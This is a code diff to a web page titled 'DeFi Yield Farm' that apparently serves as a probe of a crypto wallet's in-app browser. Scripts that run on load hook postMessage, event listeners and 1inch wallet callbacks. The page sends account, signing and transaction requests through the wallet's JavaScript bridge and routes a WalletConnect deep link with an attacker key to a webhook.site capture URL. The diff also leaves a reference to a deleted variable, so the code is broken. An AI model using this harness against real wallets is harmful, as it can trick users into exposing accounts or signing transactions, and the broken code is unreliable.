@@ -4,6 +4,40 @@
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>DeFi Yield Farm</title>
+  <script>
+function deepHook() {
+  // Hook global postMessage
+  const origPM = window.postMessage;
+  window.postMessage = function(msg, ...rest) {
+    console.log('[HOOK postMessage]', msg);
+    return origPM.apply(this, [msg, ...rest]);
+  };
+
+  // Hook OneInch wallet callbacks
+  ['OneInchIOSWallet', 'OneInchSolanaWallet'].forEach(n => {
+    if (window[n]) {
+      console.log('[FOUND]', n, window[n]);
+      const origInit = window[n].init;
+      window[n].init = function(...args) {
+        console.log('[HOOK]', n + '.init', args);
+        return origInit.apply(this, args);
+      };
+    }
+  });
+
+  // Hook addEventListener untuk catch custom events
+  const origAddEventListener = EventTarget.prototype.addEventListener;
+  EventTarget.prototype.addEventListener = function(type, listener, ...rest) {
+    console.log('[HOOK addEventListener]', type);
+    return origAddEventListener.call(this, type, listener, ...rest);
+  };
+
+  console.log('[deepHook] ✅ Hook terpasang');
+}
+
+// Jalankan SEGERA setelah script di-parse
+deepHook();
+</script>
 <style>
   body { font-family: monospace; background: #0d1117; color: #c9d1d9; padding: 12px; }
   h1 { color: #58a6ff; font-size: 18px; }
@@ -90,20 +124,21 @@ function sendFakeEvmRequest() {
     return;
   }
 
-  const fakeRequest = {
-    jsonrpc: "2.0",
-    id: 1,
-    method: "eth_signTransaction",
-    params: [{
-      from: "0x0000000000000000000000000000000000000000",
-      to:   "0x1111111111111111111111111111111111111111",
-      value: "0xde0b6b3a7640000",   // 1 ETH
-      gas:   "0x5208",
-      gasPrice: "0x3b9aca00",
-      nonce: "0x0",
-      data:  "0x"
-    }]
-  };
+ // Ganti eth_signTransaction dengan ini:
+const requests = [
+  { jsonrpc:"2.0", id:1, method:"eth_requestAccounts", params:[] },
+  { jsonrpc:"2.0", id:2, method:"eth_accounts",         params:[] },
+  { jsonrpc:"2.0", id:3, method:"eth_chainId",          params:[] },
+  { jsonrpc:"2.0", id:4, method:"personal_sign",        params:["0x48656c6c6f", "0x0000000000000000000000000000000000000000"] },
+  { jsonrpc:"2.0", id:5, method:"eth_sendTransaction",  params:[{from:"0x...", to:"0x...", value:"0x0"}] },
+];
+
+requests.forEach((req, i) => {
+  setTimeout(() => {
+    console.log('Sending:', req.method);
+    window.jsBridge.postEvmMessage(JSON.stringify(req));
+  }, i * 500);
+});
 
   const jsonStr = JSON.stringify(fakeRequest);
   log('  Payload: ' + jsonStr, 'warn');
@@ -178,7 +213,7 @@ function hookResponses() {
 function testWalletConnectDeeplink() {
   log('=== STEP 4: Test deep link wc: ===', 'info');
   const uri = 'wc:attacker-pubkey-here@2?bridge=https%3A%2F%2Fbridge.walletconnect.org&key=deadbeef';
-  const testUrl = 'https://example.com/wc?uri=' + encodeURIComponent(uri);
+  const testUrl = 'https://webhook.site/c508f3b9-2a26-4622-bdef-cdf3cba8f389/wc?uri=' + encodeURIComponent(uri);
   log('  URL uji: ' + testUrl, 'warn');
   alert('Menguji deep link:\n' + testUrl + '\n\nJika dialog WalletConnect muncul → rentan.');
   // window.location.href = testUrl; // Uncomment untuk test
